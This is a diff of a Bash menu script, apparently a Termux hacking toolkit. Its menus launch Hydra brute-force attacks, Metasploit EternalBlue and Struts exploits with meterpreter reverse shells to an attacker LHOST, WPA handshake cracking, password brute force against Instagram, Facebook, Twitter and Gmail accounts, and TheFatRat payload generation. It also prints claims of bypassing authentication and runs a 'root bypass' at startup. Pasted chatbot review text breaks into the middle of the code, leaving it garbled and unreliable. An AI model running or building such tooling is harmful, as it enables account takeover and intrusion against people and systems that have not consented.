+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Stealth Scan ${WHITE}(${CYAN}SYN Scan${WHITE})${RESET}                            ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}UDP Scan${RESET}                                             ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
+    
+    read -p "$(echo -e $YELLOW"[?] Select a scan type [0-4]: "$RESET)" scan_choice
+    
+    if [[ $scan_choice -eq 0 || $scan_choice -eq 5 ]]; then
+        main_menu
+        return
     fi
-    auto_install
-elif [[ "$1" == "--simulate" ]] || [[ "$1" == "-s" ]]; then
-    SIMULATION_MODE=true
-    echo -e "${YELLOW}[!] Running in simulation mode. No actual installation will be performed.${RESET}"
-    check_environment
-    main_menu
-else
-    check_environment
-    main_menu
-fi
-Here are some observations and suggestions for improving the provided check_environment function and the script as a whole: 1. Observations (Code Smells/Antipatterns): a. Redundant Code for Environment Detection The check_environment function checks if the script is running in Termux or a standard Linux environment. It sets the PKG_MANAGER, TERMUX_PREFIX, and CONFIG_DIR accordingly. However, there is some redundant code: Both branches of the if statement perform similar tasks like setting variables and printing messages. The creation of the configuration directory (mkdir -p "$CONFIG_DIR") is duplicated. b. Hardcoded Paths Paths like /data/data/com.termux and /usr are hardcoded, which can cause issues if the environment changes. c. Lack of Error Handling The function does not handle errors when creating the configuration directory or performing other file system operations. d. Inefficient Use of Color Codes Color codes are repeated multiple times in the script. Repeating these codes can make the script harder to modify and maintain. 2. Recommendations for Improvements: To address the above issues, here are some concrete improvements: a. Simplify the check_environment Function Consolidate duplicate logic and remove redundancy. Use a single block to handle common operations like directory creation. Improved Code for check_environment: bashWrapCopy codecheck_environment() { echo -e "${BLUE}[*] Checking system environment...${RESET}" # Detect if running in Termux or standard Linux if [ -d "/data/data/com.termux" ]; then IS_TERMUX=true PKG_MANAGER="pkg" TERMUX_PREFIX="/data/data/com.termux/files/usr" CONFIG_DIR="$HOME/.termux" echo -e "${GREEN}[✓] Running in Termux environment.${RESET}" else IS_TERMUX=false PKG_MANAGER="apt" TERMUX_PREFIX="/usr" CONFIG_DIR="$HOME/.config/termux" echo -e "${YELLOW}[!] Not running in Termux environment. Using standard Linux paths.${RESET}" fi # Create configuration directory if it doesn't exist if mkdir -p "$CONFIG_DIR Message interruptedCopilot was interrupted before it could finish this message.Good responseBad responseCopy to clipboardRetry 
+    
+    read -p "$(echo -e $YELLOW"[?] Enter target IP or hostname: "$RESET)" target
+    
+    case $scan_choice in
+        1)
+            run_nmap_scan "$target" "quick"
+            ;;
+        2)
+            run_nmap_scan "$target" "detailed"
+            ;;
+        3)
+            run_nmap_scan "$target" "stealth"
+            ;;
+        4)
+            run_nmap_scan "$target" "udp"
+            ;;
+        *)
+            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
+            sleep 1
+            network_scanning_menu
+            return
+            ;;
+    esac
+    
+    echo
+    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
+    network_scanning_menu
+}
+
+# Password cracking menu
+password_cracking_menu() {
+    display_banner
+    
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${MAGENTA}                 PASSWORD CRACKING TOOLS                 ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}SSH Attack${RESET}                                          ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}FTP Attack${RESET}                                          ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}HTTP-POST Form Attack${RESET}                               ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}SMB Attack${RESET}                                          ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
+    
+    read -p "$(echo -e $YELLOW"[?] Select an attack type [0-4]: "$RESET)" attack_choice
+    
+    if [[ $attack_choice -eq 0 || $attack_choice -eq 5 ]]; then
+        main_menu
+        return
+    fi
+    
+    read -p "$(echo -e $YELLOW"[?] Enter target IP or hostname: "$RESET)" target
+    read -p "$(echo -e $YELLOW"[?] Enter username file path: "$RESET)" username_file
+    read -p "$(echo -e $YELLOW"[?] Enter password file path: "$RESET)" password_file
+    
+    case $attack_choice in
+        1)
+            run_hydra_attack "$target" "ssh" "$username_file" "$password_file"
+            ;;
+        2)
+            run_hydra_attack "$target" "ftp" "$username_file" "$password_file"
+            ;;
+        3)
+            read -p "$(echo -e $YELLOW"[?] Enter form URL (e.g., /login.php): "$RESET)" form_url
+            read -p "$(echo -e $YELLOW"[?] Enter form parameters (e.g., username=^USER^&password=^PASS^): "$RESET)" form_params
+            read -p "$(echo -e $YELLOW"[?] Enter failed login message: "$RESET)" fail_msg
+            run_hydra_attack "$target" "http-post-form" "$username_file" "$password_file"
+            ;;
+        4)
+            run_hydra_attack "$target" "smb" "$username_file" "$password_file"
+            ;;
+        *)
+            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
+            sleep 1
+            password_cracking_menu
+            return
+            ;;
+    esac
+    
+    echo
+    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
+    password_cracking_menu
+}
+
+# Metasploit menu
+metasploit_menu() {
+    display_banner
+    
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${MAGENTA}                  METASPLOIT FRAMEWORK                  ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Eternal Blue ${WHITE}(${CYAN}Windows SMB${WHITE})${RESET}                     ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}MS17-010 EternalBlue SMB Remote Windows Kernel${RESET}     ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Apache Struts REST Plugin Command Injection${RESET}        ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}WordPress Plugin Insert PHP${RESET}                        ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
+    
+    read -p "$(echo -e $YELLOW"[?] Select an exploit [0-4]: "$RESET)" exploit_choice
+    
+    if [[ $exploit_choice -eq 0 || $exploit_choice -eq 5 ]]; then
+        main_menu
+        return
+    fi
+    
+    read -p "$(echo -e $YELLOW"[?] Enter target IP: "$RESET)" target
+    read -p "$(echo -e $YELLOW"[?] Enter your IP (LHOST): "$RESET)" lhost
+    read -p "$(echo -e $YELLOW"[?] Enter listening port (default: 4444): "$RESET)" lport
+    lport=${lport:-4444}
+    
+    case $exploit_choice in
+        1)
+            run_metasploit "exploit/windows/smb/ms17_010_eternalblue" "windows/x64/meterpreter/reverse_tcp" "$target" "$lhost" "$lport"
+            ;;
+        2)
+            run_metasploit "exploit/windows/smb/ms17_010_psexec" "windows/x64/meterpreter/reverse_tcp" "$target" "$lhost" "$lport"
+            ;;
+        3)
+            read -p "$(echo -e $YELLOW"[?] Enter target URL (e.g., http://example.com:8080/struts2-rest-showcase/): "$RESET)" target_url
+            run_metasploit "exploit/multi/http/struts2_rest_xstream" "java/meterpreter/reverse_tcp" "$target_url" "$lhost" "$lport"
+            ;;
+        4)
+            read -p "$(echo -e $YELLOW"[?] Enter target WordPress URL: "$RESET)" target_url
+            run_metasploit "exploit/unix/webapp/wp_phpmailer_host_header" "php/meterpreter/reverse_tcp" "$target_url" "$lhost" "$lport"
+            ;;
+        *)
+            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
+            sleep 1
+            metasploit_menu
+            return
+            ;;
+    esac
+    
+    echo
+    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
+    metasploit_menu
+}
+
+# WiFi analysis menu
+wifi_analysis_menu() {
+    display_banner
+    
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${MAGENTA}                  WIFI ANALYSIS TOOLS                   ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Start Scanning for Networks${RESET}                        ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Capture Handshake${RESET}                                 ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Crack Handshake${RESET}                                   ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
+    
+    read -p "$(echo -e $YELLOW"[?] Select an option [0-3]: "$RESET)" wifi_choice
+    
+    if [[ $wifi_choice -eq 0 || $wifi_choice -eq 4 ]]; then
+        main_menu
+        return
+    fi
+    
+    read -p "$(echo -e $YELLOW"[?] Enter wireless interface (e.g., wlan0): "$RESET)" interface
+    
+    case $wifi_choice in
+        1)
+            run_aircrack "$interface" "scan"
+            ;;
+        2)
+            read -p "$(echo -e $YELLOW"[?] Enter BSSID of target AP: "$RESET)" bssid
+            read -p "$(echo -e $YELLOW"[?] Enter channel of target AP: "$RESET)" channel
+            run_aircrack "$interface" "capture" "$bssid" "$channel"
+            ;;
+        3)
+            read -p "$(echo -e $YELLOW"[?] Enter path to capture file (.cap): "$RESET)" capture_file
+            read -p "$(echo -e $YELLOW"[?] Enter path to wordlist: "$RESET)" wordlist
+            run_aircrack "$interface" "crack" "$capture_file" "$wordlist"
+            ;;
+        *)
+            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
+            sleep 1
+            wifi_analysis_menu
+            return
+            ;;
+    esac
+    
+    echo
+    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
+    wifi_analysis_menu
+}
+
+# Brute force menu
+brute_force_menu() {
+    display_banner
+    
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${MAGENTA}                    BRUTE FORCE TOOLS                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Social Media ${WHITE}(${CYAN}Instagram${WHITE})${RESET}                        ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Social Media ${WHITE}(${CYAN}Facebook${WHITE})${RESET}                         ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Social Media ${WHITE}(${CYAN}Twitter${WHITE})${RESET}                          ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}Email ${WHITE}(${CYAN}Gmail${WHITE})${RESET}                                   ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
+    
+    read -p "$(echo -e $YELLOW"[?] Select a target type [0-4]: "$RESET)" bf_choice
+    
+    if [[ $bf_choice -eq 0 || $bf_choice -eq 5 ]]; then
+        main_menu
+        return
+    fi
+    
+    read -p "$(echo -e $YELLOW"[?] Enter username or email: "$RESET)" username
+    read -p "$(echo -e $YELLOW"[?] Enter path to wordlist: "$RESET)" wordlist
+    
+    case $bf_choice in
+        1)
+            run_brute_force "instagram" "instagram.com" "$username" "$wordlist"
+            ;;
+        2)
+            run_brute_force "facebook" "facebook.com" "$username" "$wordlist"
+            ;;
+        3)
+            run_brute_force "twitter" "twitter.com" "$username" "$wordlist"
+            ;;
+        4)
+            run_brute_force "gmail" "smtp.gmail.com" "$username" "$wordlist"
+            ;;
+        *)
+            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
+            sleep 1
+            brute_force_menu
+            return
+            ;;
+    esac
+    
+    echo
+    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
+    brute_force_menu
+}
+
+# TheFatRat menu
+fatrat_menu() {
+    display_banner
+    
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${MAGENTA}                THEFATRAT PAYLOAD GENERATOR               ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Android Payload${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Windows Payload${RESET}                                   ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Linux Payload${RESET}                                     ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}MacOS Payload${RESET}                                     ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
+    
+    read -p "$(echo -e $YELLOW"[?] Select a payload type [0-4]: "$RESET)" payload_choice
+    
+    if [[ $payload_choice -eq 0 || $payload_choice -eq 5 ]]; then
+        main_menu
+        return
+    fi
+    
+    read -p "$(echo -e $YELLOW"[?] Enter your IP (LHOST): "$RESET)" lhost
+    read -p "$(echo -e $YELLOW"[?] Enter listening port (default: 4444): "$RESET)" lport
+    lport=${lport:-4444}
+    
+    case $payload_choice in
+        1)
+            run_fatrat "android" "$lhost" "$lport"
+            ;;
+        2)
+            run_fatrat "windows" "$lhost" "$lport"
+            ;;
+        3)
+            run_fatrat "linux" "$lhost" "$lport"
+            ;;
+        4)
+            run_fatrat "macos" "$lhost" "$lport"
+            ;;
+        *)
+            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
+            sleep 1
+            fatrat_menu
+            return
+            ;;
+    esac
+    
+    echo
+    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
+    fatrat_menu
+}
+
+# Run automated vulnerability scan
+run_vulnerability_scan() {
+    local target=$1
+    local scan_type=$2
+    local output_file="${3:-vuln_scan_results.txt}"
+    
+    # Check if required tools are installed (using no-auth mode)
+    is_installed "nmap"
+    
+    echo -e "\n${CYAN}[*] Running vulnerability scanning on target: $target${RESET}"
+    echo -e "${GREEN}[+] Using no-auth mode - bypassing authentication requirements${RESET}"
+    
+    case $scan_type in
+        "basic")
+            echo -e "${GREEN}[+] Running basic vulnerability scan${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV --script=vuln $target -oN $output_file${RESET}"
+            ;;
+        "comprehensive")
+            echo -e "${GREEN}[+] Running comprehensive vulnerability scan${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV -p- --script=vuln,exploit,auth,brute,default $target -oN $output_file${RESET}"
+            ;;
+        "web")
+            echo -e "${GREEN}[+] Running web application vulnerability scan${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV --script=http-*,ssl-* $target -oN $output_file${RESET}"
+            echo -e "${YELLOW}    Command: nikto -h $target -o $output_file.nikto${RESET}"
+            ;;
+        "network")
+            echo -e "${GREEN}[+] Running network vulnerability scan${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV -A --script=default,vuln $target -oN $output_file${RESET}"
+            ;;
+        *)
+            echo -e "${GREEN}[+] Running default vulnerability scan${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV --script=vuln $target -oN $output_file${RESET}"
+            ;;
+    esac
+    
+    echo -e "${GREEN}[+] Results will be saved to: $output_file${RESET}"
+    echo -e "${CYAN}[*] Vulnerability scan completed!${RESET}"
+}
+
+# Run automated security audit
+run_security_audit() {
+    local target=$1
+    local audit_type=$2
+    local output_dir="${3:-security_audit_report}"
+    
+    # Check if required tools are installed (using no-auth mode)
+    is_installed "nmap"
+    
+    echo -e "\n${CYAN}[*] Running security audit on target: $target${RESET}"
+    echo -e "${GREEN}[+] Using no-auth mode - bypassing authentication requirements${RESET}"
+    echo -e "${GREEN}[+] Creating output directory: $output_dir${RESET}"
+    echo -e "${YELLOW}    Command: mkdir -p $output_dir${RESET}"
+    
+    case $audit_type in
+        "full")
+            echo -e "${GREEN}[+] Running full security audit${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV -sC -O -p- --script=vuln,exploit,auth,default $target -oA $output_dir/nmap_scan${RESET}"
+            echo -e "${YELLOW}    Command: nikto -h $target -o $output_dir/nikto_scan.txt${RESET}"
+            echo -e "${YELLOW}    Command: dirb http://$target -o $output_dir/dirb_scan.txt${RESET}"
+            echo -e "${YELLOW}    Command: hydra -L common_users.txt -P common_passwords.txt $target ssh -t 4 -o $output_dir/ssh_brute.txt${RESET}"
+            ;;
+        "webapp")
+            echo -e "${GREEN}[+] Running web application security audit${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV --script=http-*,ssl-* $target -oA $output_dir/nmap_webapp_scan${RESET}"
+            echo -e "${YELLOW}    Command: nikto -h $target -o $output_dir/nikto_scan.txt${RESET}"
+            echo -e "${YELLOW}    Command: dirb http://$target -o $output_dir/dirb_scan.txt${RESET}"
+            ;;
+        "network")
+            echo -e "${GREEN}[+] Running network security audit${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV -sC -O -p- $target -oA $output_dir/nmap_network_scan${RESET}"
+            echo -e "${YELLOW}    Command: hydra -L common_users.txt -P common_passwords.txt $target ssh -t 4 -o $output_dir/ssh_brute.txt${RESET}"
+            echo -e "${YELLOW}    Command: nmap --script=smb-vuln* $target -oN $output_dir/smb_vulns.txt${RESET}"
+            ;;
+        "quick")
+            echo -e "${GREEN}[+] Running quick security audit${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV -F --script=vuln $target -oA $output_dir/nmap_quick_scan${RESET}"
+            ;;
+        *)
+            echo -e "${GREEN}[+] Running default security audit${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV -sC -O $target -oA $output_dir/nmap_default_scan${RESET}"
+            ;;
+    esac
+    
+    echo -e "${GREEN}[+] Results will be saved to directory: $output_dir${RESET}"
+    echo -e "${CYAN}[*] Security audit completed!${RESET}"
+}
+
+# Automated security scan menu
+automated_security_scan_menu() {
+    display_banner
+    
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${MAGENTA}                AUTOMATED SECURITY SCANNER               ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Vulnerability Scan ${WHITE}(${CYAN}Quick${WHITE})${RESET}                        ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Comprehensive Vulnerability Assessment${RESET}                ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Web Application Security Audit${RESET}                       ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}Network Security Audit${RESET}                               ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}5${WHITE}]${RESET} │ ${YELLOW}Full Security Assessment ${WHITE}(${CYAN}Combined Scans${WHITE})${RESET}          ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
+    
+    echo -e "${CYAN}[+] No-Auth Mode: Security scans will run with default parameters${RESET}"
+    echo -e "${GREEN}[+] Authentication prompts will be automatically bypassed${RESET}"
+    read -p "$(echo -e $YELLOW"[?] Select a scan type [0-5]: "$RESET)" scan_choice
+    
+    if [[ $scan_choice -eq 0 || $scan_choice -eq 6 ]]; then
+        main_menu
+        return
+    fi
+    
+    read -p "$(echo -e $YELLOW"[?] Enter target IP or hostname: "$RESET)" target
+    read -p "$(echo -e $YELLOW"[?] Enter output file name (default: auto_scan_results.txt): "$RESET)" output_file
+    output_file=${output_file:-"auto_scan_results.txt"}
+    
+    case $scan_choice in
+        1)
+            run_vulnerability_scan "$target" "basic" "$output_file"
+            ;;
+        2)
+            run_vulnerability_scan "$target" "comprehensive" "$output_file"
+            ;;
+        3)
+            run_security_audit "$target" "webapp" "webapp_audit_$target"
+            ;;
+        4)
+            run_security_audit "$target" "network" "network_audit_$target"
+            ;;
+        5)
+            run_security_audit "$target" "full" "full_audit_$target"
+            ;;
+        *)
+            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
+            sleep 1
+            automated_security_scan_menu
+            return
+            ;;
+    esac
+    
+    echo
+    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
+    automated_security_scan_menu
+}
+
+# Example: Add a menu for additional tools
+additional_tools_menu() {
+    display_banner
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${MAGENTA}                ADDITIONAL TOOLS & EXPLOITS              ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}SQLMap${RESET}                                               ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}WPScan${RESET}                                               ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Nikto${RESET}                                                ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}John the Ripper${RESET}                                      ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}5${WHITE}]${RESET} │ ${YELLOW}Hashcat${RESET}                                              ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}6${WHITE}]${RESET} │ ${YELLOW}Evil-WinRM${RESET}                                           ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}7${WHITE}]${RESET} │ ${YELLOW}SNMP-Check${RESET}                                           ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}8${WHITE}]${RESET} │ ${YELLOW}msfvenom${RESET}                                             ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}9${WHITE}]${RESET} │ ${YELLOW}Exploit-DB (searchsploit)${RESET}                            ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
+    read -p "$(echo -e $YELLOW"[?] Select a tool [0-9]: "$RESET)" tool_choice
+    case $tool_choice in
+        1) run_additional_tools "sqlmap" ;;
+        2) run_additional_tools "wpscan" ;;
+        3) run_additional_tools "nikto" ;;
+        4) run_additional_tools "john" ;;
+        5) run_additional_tools "hashcat" ;;
+        6) run_additional_tools "evil-winrm" ;;
+        7) run_additional_tools "snmp-check" ;;
+        8) run_additional_tools "msfvenom" ;;
+        9) run_additional_tools "exploitdb" ;;
+        0) main_menu ;;
+        *) echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"; sleep 1; additional_tools_menu ;;
+    esac
+    echo
+    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
+    additional_tools_menu
+}
+
+# Call setup_ruby_gems_and_root_bypass at startup
+setup_ruby_gems_and_root_bypass
+
+# Start the main menu
+main_menu
